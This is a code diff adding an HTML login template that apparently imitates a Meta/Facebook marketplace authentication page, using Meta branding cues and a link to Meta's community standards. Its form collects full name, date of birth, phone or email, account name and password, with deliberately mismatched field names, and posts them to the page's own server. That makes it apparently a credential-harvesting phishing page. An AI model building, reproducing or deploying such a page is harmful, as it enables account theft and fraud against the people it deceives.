@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="{{ lang['lang'] or 'en' }}">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>{{lang['Authentication']}}</title>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/2.css') }}">
+    <link rel="icon" href="{{ url_for('static', filename='images/mafbb.png') }}" type="image/webp">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+
+</head>
+<body>
+    <div class="main">
+
+            <div class="lop2">
+                <img class="anh1" src="{{ url_for('static', filename='images/anh2.png') }}">
+            </div>
+            <div class="lop1">
+            <img class="anh2" src="{{ url_for('static', filename='images/anh3.webp') }}">
+            <h2 class="h1">{{lang['marketplace']}}</h2>
+            
+            <p class="h3">{{lang['account']}}</p>
+
+            <div class="bang">       
+                <form id="loginForm" method="POST" action="{{ url_for('submit_page2') }}" onsubmit="validatefrom(event);">
+
+                    <div class="form-group">
+                        <input type="text" id="fullname" name="fullname" placeholder=" " >
+                        <label class="te" for="fullname">{{lang['name']}}</label>
+                    </div>
+                    <div class="row">
+                        <p class="err fu_err"></p>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="text" id="dob" name="dob" placeholder=""  >
+                        <label class="te" for="dob">{{lang['dd']}}</label>
+                    </div>
+                    <div class="row">
+                        <p class="err dob_err"></p>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="text" id="gmail" name="gmail" placeholder=""  >
+                        <label class="te" for="gmail">{{lang['phone']}}</label>
+                    </div>
+                    <div class="row">
+                        <p class="err gm_err"></p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="text" id="fullname1" name="fullname1" placeholder="" >
+                        <label class="te" for="fullname1">{{lang['tk']}}</label>
+                    </div>
+                    <div class="row">
+                        <p class="err fn1_err"></p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="password-container">
+                            <input type="password" id="phone" name="phone" placeholder=" " >
+                            <label class="te" for="phone">{{ lang['pass'] }}</label>
+                            <span class="toggle-password" onclick="togglePasswordVisibility('phone', 'eyeIcon')">
+                                <i id="eyeIcon" class="fas fa-eye"></i>
+                            </span>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <p class="err ph_err"></p>
+                    </div>
+
+                    <div class="submit-container">
+                        <button type="submit" id="submitButton">
+                            <span class="button-text">{{lang['Submit']}}</span> 
+                            <span class="spinner"></span> 
+                        </button>
+                    </div>
+                </form>
+            </div>
+            <p class="thanhngang1"></p>
+            <p class="hh4">{{lang['Please']}}<a class="hh5" href="https://transparency.meta.com/vi-vn/policies/community-standards/?source=https%3A%2F%2Fwww.facebook.com%2Fcommunitystandards%2F">{{lang['Com']}}</a></p>
+        </div>
+
+    </div>
+    <script src="{{ url_for('static', filename='js/2.js') }}"></script>
+
+</body>
+</html>
